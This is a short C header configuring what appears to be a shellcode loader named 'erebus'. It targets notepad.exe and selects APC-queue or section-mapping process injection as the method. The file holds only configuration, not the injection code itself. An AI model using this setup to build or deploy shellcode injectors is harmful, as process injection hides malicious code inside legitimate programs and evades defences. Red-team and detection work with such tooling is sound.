#ifndef EREBUS_CONFIG
#define EREBUS_CONFIG
#pragma once

#define CONFIG_TARGET_PROCESS L"C:\\Windows\\System32\\notepad.exe\0"

#define CONFIG_INJECTION_METHOD 2

#define CONFIG_INJECTION_TYPE 1
#if CONFIG_INJECTION_TYPE == 1
#define ExecuteShellcode erebus::InjectionNtQueueApcThread
#elif CONFIG_INJECTION_TYPE == 2
#define ExecuteShellcode erebus::InjectionNtMapViewOfSection
#endif

#endif
